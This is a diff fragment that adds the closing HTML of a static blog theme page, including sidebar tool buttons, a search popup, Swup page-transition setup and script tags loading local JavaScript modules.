+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
